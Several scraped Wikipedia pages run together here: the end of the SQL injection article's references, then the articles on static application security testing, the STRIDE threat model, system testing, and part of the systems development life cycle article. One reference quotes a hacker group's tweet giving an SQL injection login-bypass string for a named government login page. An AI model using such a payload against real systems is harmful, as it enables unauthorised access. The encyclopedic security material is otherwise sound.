
^ "Did Little Bobby Tables migrate to Sweden?". Alicebobandmallory.com. Archived from the original on July 1, 2012. Retrieved June 3, 2011.

^ Royal Navy website attacked by Romanian hacker Archived November 9, 2010, at the Wayback Machine BBC News, 8-11-10, Accessed November 2010

^ Sam Kiley (November 25, 2010). "Super Virus A Target For Cyber Terrorists". Archived from the original on November 28, 2010. Retrieved November 25, 2010.

^ "We Are Anonymous: Inside the Hacker World of LulzSec" (PDF). Little, Brown and Company. Archived from the original (PDF) on July 18, 2012.

^ "MySQL.com compromised". sucuri. Archived from the original on March 31, 2011.

^ "Hacker breaks into Barracuda Networks database". Archived from the original on July 27, 2011.

^ "site user password intrusion info". Dslreports.com. Archived from the original on October 18, 2012. Retrieved June 3, 2011.

^ "DSLReports says member information stolen". Cnet News. April 28, 2011. Archived from the original on March 21, 2012. Retrieved April 29, 2011.

^ "DSLReports.com breach exposed more than 100,000 accounts". The Tech Herald. April 29, 2011. Archived from the original on April 30, 2011. Retrieved April 29, 2011.

^ "LulzSec hacks Sony Pictures, reveals 1m passwords unguarded", electronista.com, June 2, 2011, archived from the original on June 6, 2011, retrieved June 3, 2011

^ "Imperva.com: PBS Hacked - How Hackers Probably Did It". Archived from the original on June 29, 2011. Retrieved July 1, 2011.

^ "Wurm Online is Restructuring". May 11, 2012. Archived from the original on May 22, 2012.

^ Chenda Ngak. "Yahoo reportedly hacked: Is your account safe?" Archived July 14, 2012, at the Wayback Machine, CBS News. July 12, 2012. Retrieved July 16, 2012.

^ Yap, Jamie (July 12, 2012). "450,000 user passwords leaked in Yahoo breach". ZDNet. Archived from the original on July 2, 2014. Retrieved February 18, 2017.

^ Perlroth, Nicole (October 3, 2012). "Hackers Breach 53 Universities and Dump Thousands of Personal Records Online". New York Times. Archived from the original on October 5, 2012.

^ "RedHack Breaches Istanbul Administration Site, Hackers Claim to Have Erased Debts". Archived from the original on June 29, 2013.

^ @RedHack_EN (June 27, 2013). "Open to public hacking. One of Governor of Istanbul's site User: 'or='  Pass: 'or=' Site:ioi.gov.tr/fatura/login.php pic.twitter.com/ZEHBFJLVfT" (Tweet). Archived from the original on August 12, 2016 – via Twitter.

^ Kovacs, Eduard (November 4, 2013). "Hackers Leak Data Allegedly Stolen from Chinese Chamber of Commerce Website". Softpedia News. Archived from the original on March 2, 2014. Retrieved February 27, 2014.

^ "40,000 AVS TV Accounts Leaked". Maurihackers. Archived from the original on February 19, 2015. Retrieved February 19, 2015.

^ "United Nations Internet Governance Forum Breached". February 21, 2014. Archived from the original on February 19, 2015. Retrieved February 19, 2015.

^ Kovacs, Eduard (February 21, 2014). "Details of 70,000 Users Leaked by Hackers from Systems of SPIROL International". Softpedia News. Archived from the original on February 19, 2015. Retrieved February 19, 2015.

^ Dance, Scott (March 7, 2014). "Hacker breaches Hopkins server, but officials say identity theft not a concern". The Baltimore Sun. Archived from the original on April 14, 2014. Retrieved April 14, 2014.

^ Damon Poeter. 'Close-Knit' Russian Hacker Gang Hoards 1.2 Billion ID Creds Archived July 14, 2017, at the Wayback Machine, PC Magazine, August 5, 2014

^ Nicole Perlroth. Russian Gang Amasses Over a Billion Internet Passwords Archived February 27, 2017, at the Wayback Machine, The New York Times, August 5, 2014.

^ "TalkTalk gets record £400,000 fine for failing to prevent October 2015 attack". October 5, 2016. Archived from the original on October 24, 2016. Retrieved October 23, 2016.

^ Catania, Sam (August 13, 2020). "Vulnerability in 'Link' website may have exposed data on Stanford students' crushes". The Stanfort Daily. Retrieved September 5, 2020.

^ Goodin, Dan (March 2, 2021). "Rookie coding mistake prior to Gab hack came from site's CTO". Ars Technica.

^ Goodin, Dan (March 8, 2021). "Gab, a haven for pro-Trump conspiracy theories, has been hacked again". Ars Technica.

^ Munroe, Randall. "XKCD: Exploits of a Mom". Archived from the original on February 25, 2013. Retrieved February 26, 2013.

^ "The Bobby Tables Guide to SQL Injection". September 15, 2009. Archived from the original on November 7, 2017. Retrieved October 30, 2017.

^ "Jego firma ma w nazwie SQL injection. Nie zazdrościmy tym, którzy będą go fakturowali ;)". Niebezpiecznik (in Polish). September 11, 2014. Archived from the original on September 24, 2014. Retrieved September 26, 2014.


External links[edit]
SQL Injection Knowledge Base, by Websec.
WASC Threat Classification - SQL Injection Entry, by the Web Application Security Consortium.
Why SQL Injection Won't Go Away Archived November 9, 2012, at the Wayback Machine, by Stuart Thomas.
SDL Quick security references on SQL injection by Bala Neerumalla.
How security flaws work: SQL injection




Retrieved from "https://en.wikipedia.org/w/index.php?title=SQL_injection&oldid=1135296466"
Categories: Injection exploitsSQLHidden categories: All articles with dead external linksArticles with dead external links from February 2022Articles with permanently dead external linksWebarchive template wayback linksCS1 Polish-language sources (pl)Articles with short descriptionShort description is different from WikidataUse mdy dates from February 2012Articles with example SQL code
 



From Wikipedia, the free encyclopedia


Static application security testing (SAST) is used to secure software by reviewing the source code of the software to identify sources of vulnerabilities. Although the process of statically analyzing the source code has existed as long as computers have existed, the technique spread to security in the late 90s and the first public discussion of SQL injection in 1998 when Web applications integrated new technologies like JavaScript and Flash.
Unlike dynamic application security testing (DAST) tools for black-box testing of application functionality, SAST tools focus on the code content of the application, white-box testing.
A SAST tool scans the source code of applications and its components to identify potential security vulnerabilities in their software and architecture.
Static analysis tools can detect an estimated 50% of existing security vulnerabilities.[1]
In SDLC, SAST is performed early in the development process and at code level, and also when all pieces of code and components are put together in a consistent testing environment. SAST is also used for software quality assurance.[2] even if the many resulting false-positive impede its adoption by developers[3]
SAST tools are integrated into the development process to help development teams as they are primarily focusing on developing and delivering software respecting requested specifications.[4] 
SAST tools, like other security tools, focus on reducing the risk of downtime of applications or that private information stored in applications will not be compromised.
For the year of 2018, the Privacy Rights Clearinghouse database[5] shows that more than 612 million records have been compromised by hacking.


Overview[edit]
Application security tests of applications their release: static application security testing (SAST), dynamic application security testing (DAST), and interactive application security testing (IAST), a combination of the two.[6]
Static analysis tools examine the text of a program syntactically. They look for a fixed set of patterns or rules in the source code. Theoretically, they can also examine a compiled form of the software. This technique relies on instrumentation of the code to do the mapping between compiled components and source code components to identify issues.
Static analysis can be done manually as a code review or auditing of the code for different purposes, including security, but it is time-consuming.[7]
The precision of SAST tool is determined by its scope of analysis and the specific techniques used to identify vulnerabilities. Different levels of analysis include:

function level - sequences of instruction.
file or class-level - an extensible program-code-template for object creation.
application level - a program or group of programs that interact.
The scope of the analysis determines its accuracy and capacity to detect vulnerabilities using contextual information.[8]
At a function level, a common technique is the construction of an Abstract syntax tree to control the flow of data within the function.[9]
Since late 90s, the need to adapt to business challenges has transformed software development with componentization.[10] enforced by processes and organization of development teams[11]
Following the flow of data between all the components of an application or group of applications allows validation of required calls to dedicated procedures for sanitization and that proper actions are taken to taint data in specific pieces of code.[12][13]
The rise of web applications entailed testing them: Verizon Data Breach reports in 2016 that 40% of all data breaches use web application vulnerabilities.[14] 
As well as external security validations, there is a rise in focus on internal threats. The Clearswift Insider Threat Index (CITI) has reported that 92% of their respondents in a 2015 survey said they had experienced IT or security incidents in the previous 12 months and that 74% of these breaches were originated by insiders.[15] Lee Hadlington categorized internal threats in 3 categories: malicious, accidental, and unintentional. Mobile applications' explosive growth implies securing applications earlier in the development process to reduce malicious code development.[16]

SAST strengths[edit]
The earlier a vulnerability is fixed in the SDLC, the cheaper it is to fix. Costs to fix in development are 10 times lower than in testing, and 100 times lower than in production.[17]
SAST tools run automatically, either at the code level or application-level and do not require interaction. When integrated into a CI/CD context, SAST tools can be used to automatically stop the integration process if critical vulnerabilities are identified.[18]
Because the tool scans the entire source-code, it can cover 100% of it, while dynamic application security testing covers its execution possibly missing part of the application,[6] or unsecured configuration in configuration files.
SAST tools can offer extended functionalities such as quality and architectural testing. There is a direct correlation between the quality and the security. Bad quality software is also poorly secured software.
[19]

SAST weaknesses[edit]
Even though developers are positive about the usage of SAST tools, there are different challenges to the adoption of SAST tools by developers.[4]
With Agile Processes in software development, early integration of SAST generates many bugs, as developers using this framework focus first on features and delivery.[20]
Scanning many lines of code with SAST tools may result in hundreds or thousands of vulnerability warnings for a single application. It generates many false-positives, increasing investigation time and reducing trust in such tools. This is particularly the case when the context of the vulnerability cannot be caught by the tool[3]

See also[edit]
Security testing
Lint (software)
Dynamic application security testing
Interactive application security testing
Static program analysis
References[edit]


^ 
Okun, V.; Guthrie, W. F.; Gaucher, H.; Black, P. E. (October 2007). "Effect of static analysis tools on software security: preliminary investigation" (PDF). Proceedings of the 2007 ACM Workshop on Quality of Protection. ACM: 1–5. doi:10.1145/1314257.1314260. S2CID 6663970.

^ 
Ayewah, N.; Hovemeyer, D.; Morgenthaler, J.D.; Penix, J.; Pugh, W. (September 2008). "Using static analysis to find bugs". IEEE Software. IEEE. 25 (5): 22–29. doi:10.1109/MS.2008.130. S2CID 20646690.

^ a b Johnson, Brittany; Song, Yooki; Murphy-Hill, Emerson; Bowdidge, Robert (May 2013). "Why don't software developers use static analysis tools to find bug". ICSE '13 Proceedings of the 2013 International Conference on Software Engineering: 672–681. ISBN 978-1-4673-3076-3.

^ a b 
Oyetoyan, Tosin Daniel; Milosheska, Bisera; Grini, Mari (May 2018). "Myths and Facts About Static Application Security Testing Tools: An Action Research at Telenor Digital". International Conference on Agile Software Development. Springer: 86–103.

^ "Data Breaches | Privacy Rights Clearinghouse". privacyrights.org.

^ a b 
Parizi, R. M.; Qian, K.; Shahriar, H.; Wu, F.; Tao, L. (July 2018). "Benchmark Requirements for Assessing Software Security Vulnerability Testing Tools". IEEE 42nd Annual Computer Software and Applications Conference (COMPSAC). IEEE: 825–826. doi:10.1109/COMPSAC.2018.00139. ISBN 978-1-5386-2666-5. S2CID 52055661.

^ 
Chess, B.; McGraw, G. (December 2004). "Static analysis for security". IEEE Security & Privacy. IEEE. 2 (6): 76–79. doi:10.1109/MSP.2004.111.

^ 
Chess, B.; McGraw, G. (October 2004). "Risk Analysis in Software Design". IEEE Security & Privacy. IEEE. 2 (4): 76–84. doi:10.1109/MSP.2004.55.

^ 
Yamaguchi, Fabian; Lottmann, Markus; Rieck, Konrad (December 2012). "Generalized vulnerability extrapolation using abstract syntax trees". Proceedings of the 28th Annual Computer Security Applications Conference. IEEE. 2 (4): 359–368. doi:10.1145/2420950.2421003. S2CID 8970125.

^ 
Booch, Grady; Kozaczynski, Wojtek (September 1998). "Component-Based Software Engineering". 2006 IEEE Symposium on Security and Privacy (S&P'06). IEEE Software. 15 (5): 34–36. doi:10.1109/MS.1998.714621. S2CID 33646593.

^ 
Mezo, Peter; Jain, Radhika (December 2006). "Agile Software Development: Adaptive Systems Principles and Best Practices". 2006 IEEE Symposium on Security and Privacy (S&P'06). Information Systems Management. 23 (3): 19–30. doi:10.1201/1078.10580530/46108.23.3.20060601/93704.3. S2CID 5087532.

^ 
Livshits, V.B.; Lam, M.S. (May 2006). "Finding Security Vulnerabilities in Java Applications with Static Analysis". USENIX Security Symposium. 14: 18.

^ 
Jovanovic, N.; Kruegel, C.; Kirda, E. (May 2006). "Pixy: a static analysis tool for detecting Web application vulnerabilities". 2006 IEEE Symposium on Security and Privacy (S&P'06). IEEE: 359–368. doi:10.1109/SP.2006.29. ISBN 0-7695-2574-1. S2CID 1042585.

^ "2016 Data Breach Investigations Report" (PDF). 2016.

^ "Clearswift Insider Threat Index (CITI)" (PDF). 2015.

^ 
Xianyong, Meng; Qian, Kai; Lo, Dan; Bhattacharya, Prabir; Wu, Fan (June 2018). "Secure Mobile Software Development with Vulnerability Detectors in Static Code Analysis". 2018 International Symposium on Networks, Computers and Communications (ISNCC): 1–4. doi:10.1109/ISNCC.2018.8531071. ISBN 978-1-5386-3779-1. S2CID 53288239.

^ 
Hossain, Shahadat (October 2018). "Rework and Reuse Effects in Software Economy". Global Journal of Computer Science and Technology.

^ 
Okun, V.; Guthrie, W. F.; Gaucher, H.; Black, P. E. (October 2007). "Effect of static analysis tools on software security: preliminary investigation" (PDF). Proceedings of the 2007 ACM Workshop on Quality of Protection. ACM: 1–5. doi:10.1145/1314257.1314260. S2CID 6663970.

^ 
Siavvas, M.; Tsoukalas, D.; Janković, M.; Kehagias, D.; Chatzigeorgiou, A.; Tzovaras, D.; Aničić, N.; Gelenbe, E. (August 2019). "An Empirical Evaluation of the Relationship between Technical Debt and Software Security".  In Konjović, Z.; Zdravković, M.; Trajanović, M. (eds.). International Conference on Information Society and Technology 2019 Proceedings (Data set). Vol. 1. pp. 199–203. doi:10.5281/zenodo.3374712.

^ 
Arreaza, Gustavo Jose Nieves (June 2019). "Methodology for Developing Secure Apps in the Clouds. (MDSAC) for IEEECS Conferences". 2019 6th IEEE International Conference on Cyber Security and Cloud Computing (CSCloud)/ 2019 5th IEEE International Conference on Edge Computing and Scalable Cloud (EdgeCom). IEEE: 102–106. doi:10.1109/CSCloud/EdgeCom.2019.00-11. ISBN 978-1-7281-1661-7.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Static_application_security_testing&oldid=1118130913"
Categories: Security testingStatic program analysis
 



From Wikipedia, the free encyclopedia


Model for identifying computer security threats
STRIDE is a model for identifying computer security threats[1] developed by Praerit Garg and Loren Kohnfelder at Microsoft.[2]   It provides a mnemonic for security threats in six categories.[3]
The threats are:

Spoofing
Tampering
Repudiation
Information disclosure (privacy breach or data leak)
Denial of service
Elevation of privilege[4]
The STRIDE was initially created as part of the process of threat modeling.  STRIDE is a model of threats, used to help reason and find threats to a system.  It is used in conjunction with a model of the target system that can be constructed in parallel.  This includes a full breakdown of processes, data stores, data flows, and trust boundaries.[5]
Today it is often used by security experts to help answer the question "what can go wrong in this system we're working on?"
Each threat is a violation of a desirable property for a system:



Threat
Desired property


Spoofing
Authenticity


Tampering
Integrity


Repudiation
Non-repudiability


Information disclosure
Confidentiality


Denial of service
Availability


Elevation of privilege
Authorization


Notes on the threats[edit]
Repudiation is unusual because it's a threat when viewed from a security perspective, and a desirable property of some privacy systems, for example, Goldberg's "Off the Record" messaging system.  This is a useful demonstration of the tension that security design analysis must sometimes grapple with.
Elevation of privilege is often called escalation of privilege, or privilege escalation.  They are synonymous.

See also[edit]
Attack tree – another approach to security threat modeling, stemming from dependency analysis
Cyber security and countermeasure
DREAD (risk assessment model) – another mnemonic for security threats
OWASP – an organization devoted to improving web application security through education
CIA also known as AIC[6][7] – another mnemonic for a security model to build security in IT systems
References[edit]


^ Kohnfelder, Loren; Garg, Praerit (April 1, 1999). "The threats to our products". Microsoft Interface. Retrieved 13 April 2021.

^ Shostack, Adam (27 August 2009). ""The Threats To Our Products"". Microsoft SDL Blog. Microsoft. Retrieved 18 August 2018.

^ "The STRIDE Threat Model". Microsoft. Microsoft.

^ Guzman, Aaron; Gupta, Aditya (2017). IoT Penetration Testing Cookbook: Identify Vulnerabilities and Secure your Smart Devices. Packt Publishing. pp. 34–35. ISBN 978-1-78728-517-0.

^ Shostack, Adam (2014). Threat Modeling: Designing for Security. Wiley. pp. 61–64. ISBN 978-1118809990.

^ "Key OT Cybersecurity Challenges: Availability, Integrity and Confidentiality". tripwire.com. Retrieved 2022-07-20.

^ "What is the CIA Triad? Definition, Explanation and Examples". WhatIs.com. Retrieved 2022-05-01.


External links[edit]
Uncover Security Design Flaws Using The STRIDE Approach
This computer science article is a stub. You can help Wikipedia by expanding it.vte




Retrieved from "https://en.wikipedia.org/w/index.php?title=STRIDE_(security)&oldid=1136293414"
Categories: Computer securityComputer science stubsHidden categories: Articles with short descriptionShort description is different from WikidataAll stub articles
 



From Wikipedia, the free encyclopedia


Testing conducted on a complete integrated software system
See also: System integration testing
This article has multiple issues. Please help improve it or discuss these issues on the talk page. (Learn how and when to remove these template messages)

This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "System testing" – news · newspapers · books · scholar · JSTOR (January 2013) (Learn how and when to remove this template message)
This article may be unbalanced towards certain viewpoints. Please improve the article by adding information on neglected viewpoints, or discuss the issue on the talk page. (October 2018)

 (Learn how and when to remove this template message)
System testing is testing conducted on a complete integrated system to evaluate the system's compliance with its specified requirements.[citation needed]
System testing takes, as its input, all of the integrated components that have passed integration testing. The purpose of integration testing is to detect any inconsistencies between the units that are integrated together (called assemblages). System testing seeks to detect defects both within the "inter-assemblages" and also within the system as a whole.[citation needed] The actual result is the behavior produced or observed when a component or system is tested.[1]
System testing is performed on the entire system in the context of either functional requirement specifications (FRS) or system requirement specification (SRS), or both. System testing tests not only the design, but also the behaviour and even the believed expectations of the customer. It is also intended to test up to and beyond the bounds defined in the software or hardware requirements specification(s).[citation needed]


Approaches[edit]
Destructive testing: tests are carried out to the specimen's failure, in order to understand a specimen's performance or material behaviour under different loads.
Nondestructive testing: analysis techniques to evaluate the properties of a material, component or system without causing damage.
Fault injection: A testing technique which stress the system in an unusual way to examine the system behavior.[2][3][4]
Subject-specific test methods[edit]
Software testing[edit]
Software testing is an investigation conducted to provide stakeholders with information about the quality of the software product or service under test.[5] Software testing can also provide an objective, independent view of the software to allow the business to appreciate and understand the risks of software implementation. Software testing involves the execution of a software component or system component to evaluate one or more properties of interest. In general, these properties indicate the extent to which the component or system under test meets the requirements that guided its design and development, responds correctly to all kinds of inputs, performs its functions within an acceptable time, is sufficiently usable, can be installed and run in its intended environments, and achieves the general result its stakeholders desire. As the number of possible tests for even simple software components is practically infinite, all software testing uses some strategy to select tests that are feasible for the available time and resources.

Mobile-device testing[edit]
Mobile-device testing assures the quality of mobile devices, like mobile phones, PDAs, etc. The testing will be conducted on both hardware and software. And from the view of different procedures, the testing comprises R&D testing, factory testing and certificate testing. Mobile-device testing involves a set of activities from monitoring and trouble shooting mobile application, content and services on real handsets. Testing includes verification and validation of hardware devices and software applications.

See also[edit]
Automatic test equipment
Test case
Test fixture
Test plan
Automated testing
Quality control
Fault injection
Notes[edit]


^ "ISTQB Standard glossary of terms used in Software Testing".

^ Moradi, Mehrdad; Van Acker, Bert; Vanherpen, Ken; Denil, Joachim (2019).  Chamberlain, Roger; Taha, Walid; Törngren, Martin (eds.). "Model-Implemented Hybrid Fault Injection for Simulink (Tool Demonstrations)". Cyber Physical Systems. Model-Based Design. Lecture Notes in Computer Science. Cham: Springer International Publishing. 11615: 71–90. doi:10.1007/978-3-030-23703-5_4. ISBN 978-3-030-23703-5. S2CID 195769468.

^ "Optimizing fault injection in FMI co-simulation through sensitivity partitioning | Proceedings of the 2019 Summer Simulation Conference". dl.acm.org. Retrieved 2020-06-15.

^ Moradi, Mehrdad, Bentley James Oakes, Mustafa Saraoglu, Andrey Morozov, Klaus Janschek, and Joachim Denil. "Exploring Fault Parameter Space Using Reinforcement Learning-based Fault Injection." (2020).

^ Kaner, Cem (November 17, 2006). Exploratory Testing (PDF). Quality Assurance Institute Worldwide Annual Software Testing Conference. Orlando, FL. Retrieved November 22, 2014.


References[edit]
Black, Rex (2002). Managing the Testing Process (2nd ed.). Wiley Publishing. ISBN 0-471-22398-0.
vteSoftware testingThe "box" approach
Black-box testing
All-pairs testing
Exploratory testing
Fuzz testing
Model-based testing
Scenario testing
Grey-box testing
White-box testing
API testing
Mutation testing
Static testing
Testing levels
Acceptance testing
Integration testing
System testing
Unit testing
Testing types, techniques,and tactics
A/B testing
Benchmark
Compatibility testing
Concolic testing
Concurrent testing
Conformance testing
Continuous testing
Destructive testing
Development testing
Dynamic program analysis
Installation testing
Regression testing
Security testing
Smoke testing (software)
Software performance testing
Symbolic execution
Test automation
Usability testing
See also
Graphical user interface testing
Manual testing
Orthogonal array testing
Pair testing
Soak testing
Software reliability testing
Stress testing
Web testing





Retrieved from "https://en.wikipedia.org/w/index.php?title=System_testing&oldid=1127979514"
Categories: Software testingHardware testingSystems engineeringHidden categories: Articles with short descriptionShort description is different from WikidataArticles needing additional references from January 2013All articles needing additional referencesArticles needing more viewpoints from October 2018Articles with multiple maintenance issuesAll articles with unsourced statementsArticles with unsourced statements from April 2008
 



From Wikipedia, the free encyclopedia


Systems engineering terms
This article is about systems development life cycle. For the IBM's computer communication protocol, see Synchronous Data Link Control.


 Model of the software development life cycle, highlighting the maintenance phase
In systems engineering, information systems and software engineering, the systems development life cycle (SDLC), also referred to as the application development life cycle, is a process for planning, creating, testing, and deploying an information system.[1] The SDLC concept applies to a range of hardware and software configurations, as a system can be composed of hardware only, software only, or a combination of both.[2] There are usually six stages in this cycle: requirement analysis, design, development and testing, implementation, documentation, and evaluation.


Overview[edit]
A systems development life cycle is composed of distinct work phases that are used by systems engineers and systems developers to deliver information systems. Like anything that is manufactured on an assembly line, an SDLC aims to produce high-quality systems that meet or exceed expectations, based on requirements, by delivering systems within scheduled time frames and cost estimates.[3] Computer systems are complex and often link components with varying origins. Various SDLC methodologies have been created, such as waterfall, spiral, agile, rapid prototyping, incremental, and synchronize and stabilize.[4]
SDLC methodologies fit within a flexibility spectrum ranging from agile to iterative to sequential. Agile methodologies, such as XP and Scrum, focus on lightweight processes that allow for rapid changes.[5] Iterative methodologies, such as Rational Unified Process and dynamic systems development method, focus on stabilizing project scope and iteratively expanding or improving products. Sequential or big-design-up-front (BDUF) models, such as waterfall, focus on complete and correct planning to guide larger projects and limit risks to successful and predictable results.[citation needed] Anamorphic development is guided by project scope and adaptive iterations.
In project management a project can include both a project life cycle (PLC) and an SDLC, during which somewhat different activities occur. According to Taylor (2004), "the project life cycle encompasses all the activities of the project, while the systems development life cycle focuses on realizing the product requirements".[6]
SDLC is not a methodology per se, but rather a description of the phases that a methodology should address. The list of phases is not definitive, but typically includes planning, analysis, design, build, test, implement, and maintenance/support. In the Scrum framework,[7] for example, one could say a single user story goes through all the phases of the SDLC within a two-week sprint. By contrast the waterfall methodology, where every business requirement[citation needed] is translated into feature/functional descriptions which are then all implemented typically over a period of months or longer.[citation needed]

History[edit]
According to Elliott & Strachan & Radford (2004), SDLC "originated in the 1960s, to develop large scale functional business systems in an age of large scale business conglomerates. Information systems activities revolved around heavy data processing and number crunching routines".[8]
The structured systems analysis and design method (SSADM) was produced for the UK government Office of Government Commerce in the 1980s. Ever since, according to Elliott (2004), "the traditional life cycle approaches to systems development have been increasingly replaced with alternative approaches and frameworks, which attempted to overcome some of the inherent deficiencies of the traditional SDLC".[8]

Models[edit]
 A ten-phase version of the systems development life cycle[9]
SDLC provides a set of phases/steps/activities for system designers and developers to follow. Each phase builds on the results of the previous one.[9][10][11][12] Not every project requires that the phases be sequential. For smaller, simpler projects, phases may be combined/overlap.[9]

Waterfall[edit]
The oldest and best known is the waterfall model, which uses a linear sequence of steps.[10] Waterfall has different varieties. One variety is as follows:[9][10][13][14]

Preliminary analysis[edit]
Conduct with a preliminary analysis, consider alternative solutions, estimate costs and benefits, and submit a preliminary plan with recommendations.

Conduct preliminary analysis: Identify the organization's objectives and define the nature and scope of the project. Ensure that the project fits with the objectives.
Consider alternative solutions: Alternatives may come from interviewing employees, clients, suppliers, and consultants, as well as competitive analysis.
Cost-benefit analysis: Analyze the costs and benefits of the project.
Systems analysis, requirements definition[edit]
Decompose project goals[clarification needed] into defined functions and operations. This involves gathering and interpreting facts, diagnosing problems, and recommending changes. Analyze end-user information needs and resolve inconsistencies and incompleteness:[15]

Collect facts: Obtain end-user requirements by document review, client interviews, observation, and questionnaires.
Scrutinize existing system(s): Identify pros and cons.
Analyze the proposed system: Find solutions to issues and prepare specifications, incorporating appropriate user proposals.
Systems design[edit]
At this step, desired features and operations are detailed, including screen layouts, business rules, process diagrams, pseudocode, and other deliverables.

Development[edit]
Write the code.

Integration and testing[edit]
Assemble the modules in a testing environment. Check for errors, bugs, and interoperability.

Acceptance, installation, deployment[edit]
Put the system into production. This may involve training users, deploying hardware, and loading information from the prior system.

Maintenance[edit]
Monitor the system to assess its ongoing fitness. Make modest changes and fixes as needed.

Evaluation[edit]
The system and the process are reviewed. Relevant questions include whether the newly implemented system meets requirements and achieves project goals, whether the system is usable, reliable/available, properly scaled and fault-tolerant. Process checks include review of timelines and expenses, as well as user acceptance.

Disposal[edit]
At end of life, plans are developed for discontinuing the system and transitioning to its replacement. Related information and infrastructure must be repurposed, archived, discarded, or destroyed, while appropriately protecting security.[16]
In the following diagram, these stages of the are divided into ten steps, from definition to creation and modification of IT work products:

Systems analysis and design[edit]
Systems analysis and design (SAD) can be considered a meta-development activity, which serves to set the stage and bound the problem. SAD can help balance competing high-level requirements. SAD interacts with distributed enterprise architecture, enterprise I.T. Architecture, and business architecture, and relies heavily on concepts such as partitioning, interfaces, personae and roles, and deployment/operational modeling to arrive at a high-level system description. This high-level description is then broken down into the components and modules which can be analyzed, designed, and constructed separately and integrated to accomplish the business goal. SDLC and SAD are cornerstones of full life cycle product and system planning.

Object-oriented analysis and design[edit]
Object-oriented analysis and design (OOAD) is the process of analyzing a problem domain to develop a conceptual model that can then be used to guide development. During the analysis phase, a programmer develops written requirements and a formal vision document via interviews with stakeholders. 
The conceptual model that results from OOAD typically consists of use cases, and class and interaction diagrams. It may also include a user interface mock-up.
An output artifact does not need to be completely defined to serve as input of object-oriented design; analysis and design may occur in parallel. In practice the results of one activity can feed the other in an iterative process. 
Some typical input artifacts for OOAD:

Conceptual model: A conceptual model is the result of object-oriented analysis. It captures concepts in the problem domain. The conceptual model is explicitly independent of implementation details.
Use cases: A use case is a description of sequences of events that, taken together, complete a required task. Each use case provides scenarios that convey how the system should interact with actors (users). Actors may be end users or other systems. Use cases may further elaborated using diagrams. Such diagrams identify the actor and the processes they perform.
System Sequence Diagram: A System Sequence diagrams (SSD) is a picture that shows, for a particular use case, the events that actors generate, their order, including inter-system events.
User interface document: Document that shows and describes the user interface.
Data model: A data model describes how data elements relate to each other. The data model is created before the design phase. Object-oriented designs map directly from the data model. Relational designs are more involved.
System lifecycle[edit]
The system lifecycle is a view of a system or proposed system that addresses all phases of its existence to include system conception, design and development, production and/or construction, distribution, operation, maintenance and support, retirement, phase-out, and disposal.[17]

Conceptual design[edit]
The conceptual design stage is the stage where an identified need is examined, requirements for potential solutions are defined, potential solutions are evaluated, and a system specification is developed. The system specification represents the technical requirements that will provide overall guidance for system design. Because this document determines all future development, the stage cannot be completed until a conceptual design review has determined that the system specification properly addresses the motivating need.
Key steps within the conceptual design stage include:

Need identification
Feasibility analysis
System requirements analysis
System specification
Conceptual design review
Preliminary system design[edit]
During this stage of the system lifecycle, subsystems that perform the desired system functions are designed and specified in compliance with the system specification. Interfaces between subsystems are defined, as well as overall test and evaluation requirements.[18] At the completion of this stage, a development specification is produced that is sufficient to perform detailed design and development.
Key steps within the preliminary design stage include:

Functional analysis
Requirements allocation
Detailed trade-off studies
Synthesis of system options
Preliminary design of engineering models
Development specification
Preliminary design review
For example, as the system analyst of Viti Bank, you have been tasked to examine the current information system. Viti Bank is a fast-growing bank in Fiji. Customers in remote rural areas are finding difficulty to access the bank services. It takes them days or even weeks to travel to a location to access the bank services. With the vision of meeting the customers' needs, the bank has requested your services to examine the current system and to come up with solutions or recommendations of how the current system can be provided to meet its needs.

Detail design and development[edit]
This stage includes the development of detailed designs that brings initial design work into a completed form of specifications. This work includes the specification of interfaces between the system and its intended environment, and a comprehensive evaluation of the systems logistical, maintenance and support requirements. The detail design and development is responsible for producing the product, process and material specifications and may result in substantial changes to the development specification.
Key steps within the detail design and development stage include:

Detailed design
Detailed synthesis
Development of engineering and prototype models
Revision of development specification
Product, process, and material specification
Critical design review
Production and construction[edit]
During the production and/or construction stage the product is built or assembled in accordance with the requirements specified in the product, process and material specifications, and is deployed and tested within the operational target environment. System assessments are conducted in order to correct deficiencies and adapt the system for continued improvement.
Key steps within the product construction stage include:

Production and/or construction of system components
Acceptance testing
System distribution and operation
Operational testing and evaluation
System assessment
Utilization and support[edit]
Once fully deployed, the system is used for its intended operational role and maintained within its operational environment.
Key steps within the utilization and support stage include:

System operation in the user environment
Change management
System modifications for improvement
System assessment
Phase-out and disposal[edit]
Effectiveness and efficiency of the system must be continuously evaluated to determine when the product has met its maximum effective lifecycle.[19] Considerations include: Continued existence of operational need, matching between operational requirements and system performance, feasibility of system phase-out versus maintenance, and availability of alternative systems.

Phases[edit]
This section includes a list of references, related reading or external links, but its sources remain unclear because it lacks inline citations. Please help to improve this section by introducing more precise citations. (January 2023) (Learn how and when to remove this template message)
System investigation[edit]
During this step, current priorities that would be affected and how they should be handled are considered. A feasibility study determines whether creating a new or improved system is appropriate. This helps to estimate costs, benefits, resource requirements, and specific user needs. 
The feasibility study should address operational, financial, technical, human factors, and legal/political concerns.

Analysis[edit]
The goal of analysis is to determine where the problem is. This step involves decomposing the system into pieces, analyzing project goals, breaking down what needs to be created, and engaging users to define requirements.

Design[edit]
In systems design, functions and operations are described in detail, including screen layouts, business rules, process diagrams, and other documentation. Modular design reduces complexity and allows the outputs to describe the system as a collection of subsystems.
The design stage takes as its input the requirements already defined. For each requirement, a set of design elements is produced.
Design documents typically include functional hierarchy diagrams, screen layouts, business rules, process diagrams, pseudo-code, and a complete data model with a data dictionary. These elements describe the system in sufficient detail that developers and engineers can develop and deliver the system with minimal additional input.

Testing[edit]
The code is tested at various levels in software testing. Unit, system, and user acceptance tests are typically performed. Many approaches to testing have been adopted. 
The following types of testing may be relevant:

Path testing
Data set testing
Unit testing
System testing
Integration testing
Black-box testing
White-box testing
Regression testing
Automation testing
User acceptance testing
Software performance testing
Training and transition[edit]
Once a system has been stabilized through testing, SDLC ensures that proper training is prepared and performed before transitioning the system to support staff and end users. Training usually covers operational training for support staff as well as end-user training.
After training, systems engineers and developers transition the system to its production environment.

Operations and maintenance[edit]
Maintenance includes changes, fixes, and enhancements. 

Evaluation[edit]
The final phase of the SDLC is to measure the effectiveness of the system and evaluate potential enhancements.

Life cycle[edit]
Management and control[edit]
 SDLC phases related to management controls[20]
